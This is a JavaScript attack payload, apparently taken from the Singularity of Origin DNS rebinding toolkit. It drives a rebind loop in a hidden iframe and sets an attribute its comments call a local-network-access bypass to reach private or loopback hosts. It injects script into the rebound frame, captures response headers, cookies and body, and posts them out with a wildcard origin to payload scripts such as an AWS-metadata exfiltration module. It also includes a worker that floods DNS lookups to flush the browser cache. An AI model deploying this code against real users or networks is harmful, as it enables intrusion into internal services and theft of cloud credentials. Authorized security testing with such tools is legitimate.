// payload.js — loaded by /soopayload.html (template baked into singularity-server).
// Runs inside the attack iframe (rebinding origin). Drives the rebind loop and
// hands the response off to a payload script (e.g. payloads/aws-metadata-exfil.js)
// once rebinding succeeds.
//
// Filename is hardcoded in the Go binary's PayloadTemplateHandler — do NOT rename.
//
// What was stripped from the upstream version:
//   - WebSocket "Hook and Control" payload type (~280 lines: webSocketHook,
//     base64ArrayBuffer, atobUTF8/btoaUTF8, getCookies, buildCookie, ...)
//   - responseOKOrFail helper (unused)
//   - Separate flushdnscache.js worker file (now inlined as a Blob URL below)
// What's wired here:
//   - targetPath threaded via the existing postMessage config channel
//   - LNA bypass `allow` attribute on the inner childFrame
//   - Slash-normalized URL joining so amaze.html's targetPath isn't sensitive
//     to leading/trailing slashes

let sooFetch = (resource, options) => fetch(resource, options);
let Registry = {};                  // payload scripts register themselves here
let targetPath = '/';               // overwritten by 'targetpath' postMessage from manager

const Rebinder = () => {
    let headers = null, cookie = null, body = null;
    let url = null, rebindingDoneFn = null;
    let timer = null;
    let payload = null;
    let interval = 60000;
    let wsproxyport = 3129;
    let indextoken = null;
    let rebindingSuccess = false;

    const statusEl = document.getElementById('rebindingstatus');

    // Always exactly one slash between base and path
    const joinUrl = (base, path) =>
        base.replace(/\/+$/, '') + '/' + path.replace(/^\/+/, '');

    function initComms() {
        window.addEventListener('message', (e) => {
            console.log('attack frame', window.location.hostname, 'cmd:', e.data.cmd);
            switch (e.data.cmd) {
                case 'payload':     payload = e.data.param; break;
                case 'interval':    interval = parseInt(e.data.param) * 1000; break;
                case 'indextoken':  indextoken = e.data.param; break;
                case 'wsproxyport': wsproxyport = e.data.param; break;
                case 'targetpath':  targetPath = e.data.param || '/'; break;
                case 'flushdns':
                    if (e.data.param.flushDns === true) {
                        console.log('Flushing browser DNS cache');
                        flushBrowserDnsCache(e.data.param.hostname);
                    }
                    break;
                case 'stop':
                    clearInterval(timer);
                    if (!rebindingSuccess && statusEl) {
                        statusEl.innerText = 'DNS rebinding failed!';
                    }
                    break;
                case 'startFetch':
                    console.log('payload.js: fetch attack method');
                    timer = setInterval(() => run(), interval);
                    break;
                case 'startReloadChildFrame': {
                    console.log('payload.js: iframe attack method');
                    const f = document.createElement('iframe');
                    f.src = url;
                    f.id  = 'childFrame';
                    f.style.display = 'none';
                    // LNA bypass — this is the frame that actually hits the
                    // private/loopback target after rebind.
                    f.setAttribute('allow', 'local-network-access *');
                    document.body.appendChild(f);
                    sooFetch = (resource, options) => {
                        const cw = document.getElementById('childFrame').contentWindow;
                        return cw.fetch(resource, options);
                    };
                    document.getElementById('childFrame').onload = onChildFrameLoad;
                    timer = setInterval(
                        () => { document.getElementById('childFrame').src = window.origin; },
                        interval
                    );
                    break;
                }
            }
        });
    }

    // iframe-method rebinding loop, after Daniel Thatcher
    // https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari
    function onChildFrameLoad() {
        const cf = document.getElementById('childFrame');
        let doc;
        try {
            doc = cf.contentDocument || cf.contentWindow.document;
        } catch (e) {
            // Cross-origin SecurityError = the childFrame has rebound to the
            // target. Expected during the race; the next same-origin reload
            // cycle will run the fetch path. Silent return — no log spam.
            return;
        }
        const content = doc.body.innerText;
        if (content.indexOf("Singularity of Origin") !== 0) {
            injectScript(cf);
            const p = sooFetch(joinUrl(url, targetPath), { credentials: 'omit' });
            run(p);
        }
    }

    function injectScript(frame) {
        const doc = frame.contentDocument || frame.contentWindow.document;
        const s = document.createElement('script');
        s.type = 'text/javascript';
        s.innerHTML = `${sooFetch.toString()};`;
        doc.body.append(s);
    }

    function init(myUrl, myDoneFn) {
        url = myUrl;
        rebindingDoneFn = myDoneFn;
        initComms();
        window.parent.postMessage({ status: 'start' }, '*');
    }

    function run(prom) {
        const p = prom || sooFetch(joinUrl(url, targetPath), { credentials: 'omit' });
        p.then((r) => {
            let n = 0;
            for (const _ of r.headers.entries()) n++;
            if (n === 0) throw new Error('invalidHeaderCount');
            if (r.headers.get('X-Singularity-Of-Origin') === 't') {
                throw new Error('hasSingularityHeader');
            }
            headers = r.headers;
            cookie  = document.cookie;
            return r.text();
        })
        .then((data) => {
            if (data.length === 0) throw new Error('invalidResponseLength');
            if (indextoken && data.includes(indextoken)) throw new Error('hasToken');
            body = data;
            clearInterval(timer);
            window.parent.postMessage({ status: 'success', response: body }, '*');
            rebindingSuccess = true;
            if (statusEl) statusEl.innerText = 'DNS rebinding successful!';
            rebindingDoneFn(payload, headers, cookie, body, wsproxyport);
        })
        .catch((err) => {
            // Cross-realm-safe TypeError check: when sooFetch is the
            // childFrame's cw.fetch wrapper, rejected errors come from the
            // childFrame's realm, where `TypeError` is a different
            // constructor. `instanceof` lies across realms — check `.name`.
            if (err && err.name === 'TypeError') {
                console.log(`frame ${window.location.hostname} could not load: ${err}`);
                window.parent.postMessage({ status: 'error' }, '*');
            } else if (
                err.message === 'hasSingularityHeader' ||
                err.message === 'invalidResponseLength' ||
                err.message === 'hasToken' ||
                err.message === 'invalidHeaderCount'
            ) {
                console.log(`rebind not yet: ${window.location.host}`);
            } else if (err.message === 'requiresHttpAuthentication') {
                window.parent.postMessage({ status: 'requiresHttpAuthentication' }, '*');
                rebindingDoneFn(payload, headers, cookie, null);
            } else {
                console.log(`unhandled: ${err}`);
                window.parent.postMessage({ status: 'error' }, '*');
            }
        });
    }

    return { init, run };
};

// Called by /soopayload.html template after page loads. `attack` is provided by
// the loaded payload script (which assigns to a global before begin() runs, or
// is looked up from Registry by the soopayload.html template — depends on
// server build).
function begin(url) {
    const hostnameEl = document.getElementById('hostname');
    if (hostnameEl) {
        const arr = window.location.hostname.split('-');
        const port = document.location.port || '80';
        hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
    }
    const r = Rebinder();
    r.init(url, attack);
}

// ---------- DNS-cache flush worker (inlined as Blob URL; was flushdnscache.js) ----------
// Dormant unless CONFIG.flushDns=true in amaze.html. Only useful with non-'ma'
// rebinding strategies, where flushing the browser DNS resolver cache helps
// the next DNS lookup pick up the rebound A record faster.
function flushBrowserDnsCache(hostname) {
    const workerSrc = `
        function flush(hostname, port, iterations) {
            const start = Math.ceil(Math.random() * 2 ** 32);
            const max = start + iterations;
            for (let i = start; i < max; i++) {
                fetch('http://n' + i + '.' + hostname + ':' + port + '/', { mode: 'no-cors' });
            }
        }
        onmessage = (m) => flush(m.data.hostname, m.data.port, m.data.iterations);
    `;
    const blob = new Blob([workerSrc], { type: 'application/javascript' });
    const w = new Worker(URL.createObjectURL(blob));
    w.postMessage({ hostname, port: document.location.port, iterations: 1000 });
}

// ---------- helpers used by payload scripts (e.g. aws-metadata-exfil.js) ----------
function httpHeaderstoText(headers) {
    let out = '';
    for (const pair of headers.entries()) out += `\n${pair[0]}: ${pair[1]}`;
    return out;
}
